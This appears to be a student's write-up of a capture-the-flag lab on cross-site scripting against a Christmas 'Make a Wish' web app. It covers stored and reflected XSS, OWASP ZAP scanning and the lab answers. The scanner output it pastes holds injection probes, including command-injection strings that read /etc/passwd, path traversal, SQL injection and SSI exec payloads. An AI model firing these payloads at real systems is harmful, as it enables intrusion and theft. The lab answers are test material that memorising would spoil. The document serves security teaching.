DAY 6 - BE CAREFUL WITH WHAT YOU WISH ON A CHRISTMAS NIGHT [WEB EXPLOITATION] 
----

# STORY :
----

>>This year, Santa wanted to go fully digital and invented a "Make a wish!" system. 
>>It's an extremely simple web app that would allow people to anonymously share their wishes with others. Unfortunately, right after the hacker attack, the security team has discovered that someone has compromised the "Make a wish!". 
>>Most of the wishes have disappeared and the website is now redirecting to a malicious website.  
>>An attacker might have pretended to submit a wish and put a malicious request on the server! 
>>The security team has pulled a back-up server for you on 10.10.101.106:5000. Your goal is to find the way the attacker could have exploited the application.

----

# What Is XSS ?

>>Cross-site scripting (XSS) is a web vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. 
>>Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, and carry out any actions that the user is able to perform. 
>>If the victim user has privileged access within the application (i.e admin), then the attacker might be able to gain full control over all of the application's functionality and data. 
>>Even if a user is a low privileged one, XSS can still allow an attacker to obtain a lot of sensitive information.

----

# Why does it work like that?

>>XSS is exploited as some malicious content is being sent to the web browser, often taking the form of JavaScript payload, but may also include HTML, Flash, or any other type of code that the browser may execute. 
>>The variety of attacks based on XSS is almost limitless, but all of them come down to exactly two types: stored and reflected.

----

# Types of XSS

>>Stored XSS works when a certain malicious JavaScript is submitted and later on stored directly on the website. 
>>For example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. 
>>In other words, in any content that persistently exists on the website and can be viewed by victims.

```js
<!-- Normal comment--> <p>      Your comment goes here </p> <!--Malicious comment--> <p>      <script>          evilcode()      </script> </p> 
```
>>Let's say we have a website with comments (Code above).  A normal comment is put under " <p></p> " tags and displayed on the website. 
>>A malicious user can put " <script></script> " tags in that field to execute the " evilcode() " function every time a user sees this comment.

>>Stored XSS gives an attacker an advantage of 'injecting' malicious JavaScript behind images. 
>>By using " <img> " attribute it is possible to execute custom JS code when the image is viewed or clicked. 
For example:

```js
<img src='LINK' onmouseover="alert('xss')">
```
>>In this case, an attacker embeds an image that is going to execute alert('xss') if the user's mouse goes over it.
>>Say we have a web application that allows users to post their comments under the post.

>>An attacker can exploit this by putting an XSS payload instead of their comments and force everyone to execute a custom javascript code.

>>This is what happens if we use the above <img> payload there:

>>A malicious picture executes a custom alert('xss') once being viewed. This is the most common example of stored XSS.

>>Reflected is another type of XSS that is carried out directly in the HTTP request and requires the attacker to do a bit more work. 
>>An example of this could be malicious javascript in the link or a search field. 
>>The code is not stored on the server directly, meaning that a target user should compromise himself by clicking the link.

>>Here's a quick example of an URL with malicious javascript included:

```html
<https://somewebsite.com/titlepage?id=> <script> evilcode() </script> 
```
>>Any user that clicks on the link is going to execute the evilcode() function, eventually falling under the XSS attack.

>>Let's say a website is using a query string keyword in its URL 
" 10.10.100.27/reflected?keyword=hello " like so:

>>A search query is put after this keyword parameter. 
>>The XSS can be exploited by putting a payload instead of the search query.
>>The url starts with " 10.10.100.27/reflected?keyword= ". 
>>By adding text onto the keyword, we can perform reflected XSS like 
" 10.10.100.27/reflected?keyword=<script>alert(1)</script> " which results in an alert box with 1 on our screen.
>>Bingo! The XSS was successfully exploited!

----

# How to detect XSS?

>>Both reflected and stored XSS vulnerabilities can be detected in a similar way: through the use of HTML tags, such as <h1></h1>, <b></b> or others. 
>>The idea is to try out inputting text with those tags and see if that produces any differences. 
>>Any change in text size or color immediately indicates an XSS vulnerability.

>>But sometimes, it might be challenging to find them manually, and of course, we cannot forget about the basic human error. 
>>Happily, there's a solution for that! OWASP ZAP is an open-source web application security scanner. It can automatically detect web vulnerabilities.
>>You can launch ZAP by going to 'Applications -> Web -> Owasp Zap' on the attack box:

>>You'll see a fairly simple interface upon the launch.
>>On the right, you can see a button titled 'Automated scan'. Click it and it'll take you to the attack configuration page.
>>Now, simply put the target URL in the 'URL to attack' field and press 'Attack'!
>>After some time, all the vulnerabilities will be displayed in the 'Alerts' tab:

----

# Bonus: Mitigating XSS

>>The rule is simple: all user input should be sanitized at both the client and server-side so that potentially malicious characters are removed. 
>>There are libraries to help with this on every platform.
>>Smart developers should always implement a filter to any text input field and follow a strict set of rules regarding processing the inputted data. 
>>For more info about this, check out OWASP's guide: 
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md 

----

# MY DOCUMENATATION :
----

>>OPEN THE GIVEN-IP IN THE BROWSER ON PORT 5000.IT DISPLAYS

```WEBSITE
Welcome to Santa's official 'Make a Wish!' website

Year 2020

SEARCH QUERY ------------------

Here you can anonymously submit your Christmas wishes and see what other people wished too!

Showing all wishes:

Enter your wish here:

						   WISH
```

>>THE SCAN REPORT 1 FOR PERSISTENT XSS

```
URL : http://10.10.94.62:5000/
Risk : High
Confidence : Medium
Parameter : comment
Attack : </p><script>alert();</script><p> 
Evidence : 
CWE ID : 79
WASC ID : 8
Source : Active(40014 - Cross Site Scripting(Persistent))
```

>>THIS IS RESPONSE OF THE WEBSITE IN THE OWASP ZAP AFTER THE PERSISTENT XSS ATTACK

```html
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8">
    <title>Santa's portal</title>
    <link rel="stylesheet" href="/static/style.css">
  </head>

  <body>

    <header>
      <h1>Welcome to Santa's official 'Make a Wish!' website</h1>
      <p>
        Year 2020
      </p>
    </header>
    <br>
    <center>
      <h3>Here you can anonymously submit your Christmas wishes and see what other people wished too!</h3>
    </center>

    <form method="GET">
      <input type="text" name="q" 
             placeholder="Search query" autocomplete="off" />
    </form>

    
      <h3>Showing all wishes:</h3>
       <br>
        <br>
    

    
      <div>
        <p>ROBOT</p>
      </div>
    
      <div>
        <p><script>alert(1);</script></p>
      </div>
    
      <div>
        <p>laptop</p>
      </div>
    
      <div>
        <p>ZAP</p>
      </div>
    
      <div>
        <p>c:/Windows/system.ini</p>
      </div>
    
      <div>
        <p>../../../../../../../../../../../../../../../../Windows/system.ini</p>
      </div>
    
      <div>
        <p>c:\Windows\system.ini</p>
      </div>
    
      <div>
        <p>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini</p>
      </div>
    
      <div>
        <p>/etc/passwd</p>
      </div>
    
      <div>
        <p>../../../../../../../../../../../../../../../../etc/passwd</p>
      </div>
    
      <div>
        <p>c:/</p>
      </div>
    
      <div>
        <p>/</p>
      </div>
    
      <div>
        <p>c:\</p>
      </div>
    
      <div>
        <p>../../../../../../../../../../../../../../../../</p>
      </div>
    
      <div>
        <p>WEB-INF/web.xml</p>
      </div>
    
      <div>
        <p>WEB-INF\web.xml</p>
      </div>
    
      <div>
        <p>/WEB-INF/web.xml</p>
      </div>
    
      <div>
        <p>\WEB-INF\web.xml</p>
      </div>
    
      <div>
        <p>thishouldnotexistandhopefullyitwillnot</p>
      </div>
    
      <div>
        <p>http://www.google.com/</p>
      </div>
    
      <div>
        <p>http://www.google.com:80/</p>
      </div>
    
      <div>
        <p>http://www.google.com</p>
      </div>
    
      <div>
        <p>http://www.google.com/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p>http://www.google.com:80/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p>www.google.com/</p>
      </div>
    
      <div>
        <p>www.google.com:80/</p>
      </div>
    
      <div>
        <p>www.google.com</p>
      </div>
    
      <div>
        <p>www.google.com/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p>www.google.com:80/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p><!--#EXEC cmd="ls /"--></p>
      </div>
    
      <div>
        <p>"><!--#EXEC cmd="ls /"--><</p>
      </div>
    
      <div>
        <p><!--#EXEC cmd="dir \"--></p>
      </div>
    
      <div>
        <p>"><!--#EXEC cmd="dir \"--><</p>
      </div>
    
      <div>
        <p>0W45pz4p</p>
      </div>
    
      <div>
        <p></p><script>alert(1);</script><p></p>
      </div>
    
      <div>
        <p>zApPX0sS</p>
      </div>
    
      <div>
        <p>ZAP</p>
      </div>
    
      <div>
        <p>0W45pz4p</p>
      </div>
    
      <div>
        <p>ZAP</p>
      </div>
    
      <div>
        <p></p><script>alert(1);</script><p></p>
      </div>
    
      <div>
        <p>ZAP</p>
      </div>
    

    <h3>Enter your wish here:</h3>
    <form action="/" method="POST">
      <input type="text" name="comment" 
             placeholder="New book..." autocomplete="off" />
      <input type="submit" value="Wish!" />
    </form>

  </body>
</html>
```

>>THE SCAN REPORT 2 FOR REFLECTED XSS

```
URL : http://10.10.94.62:5000/
Risk : High
Confidence : Medium
Parameter : comment
Attack : </p><script>alert();</script><p> 
Evidence : </p><script>alert();</script><p> 
CWE ID : 79
WASC ID : 8
Source : Active(40014 - Cross Site Scripting(Reflected))
```

>>THIS IS RESPONSE OF THE WEBSITE IN THE OWASP ZAP AFTER THE REFLECTED XSS ATTACK

```html
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8">
    <title>Santa's portal</title>
    <link rel="stylesheet" href="/static/style.css">
  </head>

  <body>

    <header>
      <h1>Welcome to Santa's official 'Make a Wish!' website</h1>
      <p>
        Year 2020
      </p>
    </header>
    <br>
    <center>
      <h3>Here you can anonymously submit your Christmas wishes and see what other people wished too!</h3>
    </center>

    <form method="GET">
      <input type="text" name="q" 
             placeholder="Search query" autocomplete="off" />
    </form>

    
      <h3>Showing all wishes:</h3>
       <br>
        <br>
    

    
      <div>
        <p>ROBOT</p>
      </div>
    
      <div>
        <p><script>alert(1);</script></p>
      </div>
    
      <div>
        <p>laptop</p>
      </div>
    
      <div>
        <p>ZAP</p>
      </div>
    
      <div>
        <p>c:/Windows/system.ini</p>
      </div>
    
      <div>
        <p>../../../../../../../../../../../../../../../../Windows/system.ini</p>
      </div>
    
      <div>
        <p>c:\Windows\system.ini</p>
      </div>
    
      <div>
        <p>..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini</p>
      </div>
    
      <div>
        <p>/etc/passwd</p>
      </div>
    
      <div>
        <p>../../../../../../../../../../../../../../../../etc/passwd</p>
      </div>
    
      <div>
        <p>c:/</p>
      </div>
    
      <div>
        <p>/</p>
      </div>
    
      <div>
        <p>c:\</p>
      </div>
    
      <div>
        <p>../../../../../../../../../../../../../../../../</p>
      </div>
    
      <div>
        <p>WEB-INF/web.xml</p>
      </div>
    
      <div>
        <p>WEB-INF\web.xml</p>
      </div>
    
      <div>
        <p>/WEB-INF/web.xml</p>
      </div>
    
      <div>
        <p>\WEB-INF\web.xml</p>
      </div>
    
      <div>
        <p>thishouldnotexistandhopefullyitwillnot</p>
      </div>
    
      <div>
        <p>http://www.google.com/</p>
      </div>
    
      <div>
        <p>http://www.google.com:80/</p>
      </div>
    
      <div>
        <p>http://www.google.com</p>
      </div>
    
      <div>
        <p>http://www.google.com/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p>http://www.google.com:80/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p>www.google.com/</p>
      </div>
    
      <div>
        <p>www.google.com:80/</p>
      </div>
    
      <div>
        <p>www.google.com</p>
      </div>
    
      <div>
        <p>www.google.com/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p>www.google.com:80/search?q=OWASP%20ZAP</p>
      </div>
    
      <div>
        <p><!--#EXEC cmd="ls /"--></p>
      </div>
    
      <div>
        <p>"><!--#EXEC cmd="ls /"--><</p>
      </div>
    
      <div>
        <p><!--#EXEC cmd="dir \"--></p>
      </div>
    
      <div>
        <p>"><!--#EXEC cmd="dir \"--><</p>
      </div>
    
      <div>
        <p>0W45pz4p</p>
      </div>
    
      <div>
        <p></p><script>alert(1);</script><p></p>
      </div>
    

    <h3>Enter your wish here:</h3>
    <form action="/" method="POST">
      <input type="text" name="comment" 
             placeholder="New book..." autocomplete="off" />
      <input type="submit" value="Wish!" />
    </form>

  </body>
</html>
```



>>WHEN WE ACCESS THE WEBSITE AFTER THE SCAN IN THE OWASP ZAP.
>>THIS WAS THE RESULT IN THE WEBSITE AFTER THE SCAN WITH THE OWASP ZAP
```response


ZAP

c:/Windows/system.ini

../../../../../../../../../../../../../../../../Windows/system.ini

c:\Windows\system.ini

..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system.ini

/etc/passwd

../../../../../../../../../../../../../../../../etc/passwd

c:/

/

c:\

../../../../../../../../../../../../../../../../

WEB-INF/web.xml

WEB-INF\web.xml

/WEB-INF/web.xml

\WEB-INF\web.xml

thishouldnotexistandhopefullyitwillnot

http://www.google.com/

http://www.google.com:80/

http://www.google.com

http://www.google.com/search?q=OWASP%20ZAP

http://www.google.com:80/search?q=OWASP%20ZAP

www.google.com/

www.google.com:80/

www.google.com

www.google.com/search?q=OWASP%20ZAP

www.google.com:80/search?q=OWASP%20ZAP

"><

"><

0W45pz4p

zApPX0sS

ZAP

0W45pz4p

ZAP

ZAP

'

ZAP'

"

ZAP"

;

ZAP;

)

ZAP)

ZAP

ZAP

ZAP AND 1=1 --

ZAP' AND '1'='1' --

ZAP" AND "1"="1" --

ZAP AND 1=1

ZAP' AND '1'='1

ZAP" AND "1"="1

ZAP UNION ALL select NULL --

ZAP' UNION ALL select NULL --

ZAP" UNION ALL select NULL --

ZAP) UNION ALL select NULL --

ZAP') UNION ALL select NULL --

ZAP

";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var="

';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='

${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}

${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\

;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));

"+response.write([100,000*100,000)+"

+response.write({0}*{1})+

response.write(100,000*100,000)

ZAP&cat /etc/passwd&

ZAP;cat /etc/passwd;

ZAP"&cat /etc/passwd&"

ZAP";cat /etc/passwd;"

ZAP'&cat /etc/passwd&'

ZAP';cat /etc/passwd;'

ZAP&sleep 15&

ZAP;sleep 15;

ZAP"&sleep 15&"

ZAP";sleep 15;"

ZAP'&sleep 15&'

ZAP';sleep 15;'

ZAP&type %SYSTEMROOT%\win.ini

ZAP|type %SYSTEMROOT%\win.ini

ZAP"&type %SYSTEMROOT%\win.ini&"

ZAP"|type %SYSTEMROOT%\win.ini

ZAP'&type %SYSTEMROOT%\win.ini&'

ZAP'|type %SYSTEMROOT%\win.ini

ZAP&timeout /T 15

ZAP|timeout /T 15

ZAP"&timeout /T 15&"

ZAP"|timeout /T 15

ZAP'&timeout /T 15&'

ZAP'|timeout /T 15

ZAP;get-help

ZAP";get-help

ZAP';get-help

ZAP;get-help #

ZAP;start-sleep -s 15

ZAP";start-sleep -s 15

ZAP';start-sleep -s 15

ZAP;start-sleep -s 15 #

ZAP

6494130102946216655.owasp.org

http://6494130102946216655.owasp.org

https://6494130102946216655.owasp.org

http:\\6494130102946216655.owasp.org

https:\\6494130102946216655.owasp.org

//6494130102946216655.owasp.org

\\6494130102946216655.owasp.org

HtTp://6494130102946216655.owasp.org

HtTpS://6494130102946216655.owasp.org

dgCeYJjZTiCtThjJjjBdfEPvZgJYbbcthymNvNhIvRxFDQKsSMSrHpxJtpSAhkindslRGhKsrSGqrdpxLLTcCjqwbsYGSBCEsQquljtYivbDLdVrTVyAUCWensxXLkewDGAKFNjGcjQNOZFrWyVpARdIcVgctjctgkCixeRVSXTnsaAQaaQAhKnBbirwYlPRsCwmOkEotBNfMBBxwTnHQsBWrnAkMTTxgPehelPxvHRIlBnfUFOUgVflcmbFIHZJANJuortLUGMWWVinYJYKqfRZVpvRGFOdINFpvneRHiwHYjWFnjPiDGWViJUkbDuOVWrthCugoLWFMugkwXyoQJrbrsKXbZpDQjuOJMwYknftMknHxClkJYKfDwWXdGIIGVjhLSCUVBKiHvTsDULdfvEywJcqQRjXsbgwyrUwKaYupnjmvPtaeXTEnDNnhSAgOOahjSLmHeUcuaEtQEfSBkrPLaBbAowIBKiPcfEvtAptDyDpcoVbFFCitcENimbxKGoEFqOmupoEXdGCLhhMoGoiJnKwjIgChiuODTtlZqCToQXmXcSFrebrEZkoaZAIXCogCjmIRWUUkPrVKlupBHLdrlCDYVeSfTUmdTPrapmaKMiLIZBiSWBhcjKqXFBDwMxBDqZtmsJCGRaVGIVBCVOqyjBKcVaViMemcMkiRQSLTGLPYDhZNeghJuHUesShKfBrSLjteacffgnjCdJDnfcSituLOqYHsQJKBULBdCXQSdpGmrVoBiwahHixJbYPRKfokPejeKkRAqVnaXbVGbjiLSsdXZrDoKRHfKVqHZWaJXDYThxOVrsGEcwPJZJSeQTNBUqlOUZFHdZsCRHwRUJTIbtOZEIqqHyIKQvAcEdVKxklSNHToARPTgXaKsqGSNWTxZvdfAkiBdGFdCIMbDHntKBhnGlVZFCgdYtSnIdDhROuhhTAuuKWdytWMfrFcpWYSVUvsuxeoeaUealuyIeljRJGxanWpVGoODqJTMdlhrJAdRJJjdtMFrtGLPrsoGnVJQttuWtkIEwoIIoCEtWbDtHovFUeYtgPSXnrBQYNthRSouHMcuqQSBBpsmeEwFcDoaCujGkenGFodloTXnbGOSEvklreKGVNyJNEYOXqEKrcJWlCpEvuEuBVwFYIXcVyGQTnmhUKgtidSYqeTwutsMKNSsZeASPUuCtISOYkgnTgiPAanHNTkqNNkWghKWGZbtNOTMRLMgMAHdSVFhFPfSRrTtPfThsvljicesTLHYilqfDhGJllLDkbRQTxrUXqyGsIRUHRVEadmHUeiEZgvHqkhpnZGUQQCTBbIjZvwCHyGkgvmgXkNVwneMrKLgHImaxApdNobmrsKitMEFrZVTSCNvOsBGumXwcThWgfPNaHhnKPhWYsXSOkJRXjFvaSibwTSWsspjGUmqugIxnSCWktEJMKRuGNwobDwvcMjRYnTubMyodjSFHmVXdnsDIGKRZfPgkafIYthufrQuOkhEsoNwhknCliGURFVWpmuBVDBCQYwEvHSyUFFpTAblOYHaNmdAfZgHBWkXMkyCcosZxhTXrYNIBTlDDpgHwqUUTiTLCgjugTjahHYfaHbJYJCUIyrmGxEobpjKlktyOwEEHFkUeRaxQuDYymBcNvJCPnjCpsocdGiupwKPRmekImkINmJYZQCEpfWGdDPZQJXckekpJNCUQeOBlyhjaiofXpmxyeeICxCtutmPUFVEMDGNfxhsEXCByCbhycaEsrATyyjmFWCoMAbmKCTwGhyWqBMyhanykEdOoieTOEaMUWlATaaZobpPHorqVEdZbnigKVbMRpyCslbIixykHejiZFocuteLQNfAiYHCNyndGAtWWNgEnTTxRskZYeOJJiHrmUVmFdDgHwQbgkGrQqMLqIDZeXyvcZmhCOgekLKiODqrYtJlEGSupuYSFIbjUQfhXbnmwulrOoCFxkVaYqReDUDWZbglWTMCpZxpneERHdbvuaBBcKyFOosBXfqtptDNCsntHHZsEectClNDClNRUlbcqotolsxWoFBdeFZAAkMsaRcoIqQsJjgirXJdndGUqmWGsTLXGWnLXBgaGPjTCZAZGZ

ZAP

ZAP%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s

ZAP %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n

Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

any Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

any? Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

any Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

any? Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

any Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

any? Set-cookie: Tamper=434ab9a8-00a2-4c9d-9514-13f00c467a36

ZAP

@

+

|
```
>>HENCE WE FOUND THE AREA IS "q" IN THE URL AFTER WE SIMPLY TYPE SOMETHING IN THE "WISH" AREA AND PRESS ENTER.THE q "QUERY" WILL APPEAR IN THE URL AND WE ACCESSED IT WITH THE COMMAND 

```js
<script>alert(1)</script>
```

>>NOW YOU CAN ABLE TO MAKE AN ALERT APPEAR ON THE "MAKE A WISH" WEBSITE.

----

# ANSWER THE FOLLOWING :
----

1.Deploy your AttackBox (the blue "Start AttackBox" button) and the tasks machine (green button on this task) if you haven't already. Once both have deployed, open Firefox on the AttackBox and copy/paste the machines IP (http://10.10.101.106:5000) into the browser search bar (the webserver is running on port 5000, so make sure this is included in your web requests).
>>No answer needed

What vulnerability type was used to exploit the application?
>>Stored Cross-site Scripting 

What query string can be abused to craft a reflected XSS?
>>q

Launch the OWASP ZAP Application
>>No answer needed

Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?
>>2

Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the "Make a wish" website?
>>No answer needed

----